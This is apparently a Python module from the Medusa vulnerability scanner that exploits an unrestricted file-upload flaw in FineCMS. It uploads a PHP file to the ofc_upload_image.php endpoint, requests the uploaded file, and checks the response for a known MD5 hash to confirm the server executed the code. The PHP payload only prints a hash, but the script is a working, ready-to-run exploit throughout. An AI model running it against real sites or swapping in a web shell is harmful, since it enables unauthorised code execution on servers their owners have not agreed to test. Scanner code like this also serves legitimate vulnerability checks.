#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: FineCMS免费版文件上传漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0105251
author: Ascotbe
reference: Lucifer
description: FineCMS上传页面无限制,可以上传任意文件。
'''
import urllib
import requests
import random
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/dayrui/libraries/Chart/ofc_upload_image.php?name="
post_data = '''<?print(md5(1234));?>'''
filename = "test" + str(random.randrange(1000,9999)) + ".php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp2
    payload_url = scheme+"://"+url+payload+ filename
    payload_url2 =scheme+"://"+url+ "/dayrui/libraries/tmp-upload-images/" + filename
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, proxies=proxies,timeout=10, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, timeout=10, verify=False)
        con = resp2.text

        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在FineCMS任意文件上传漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass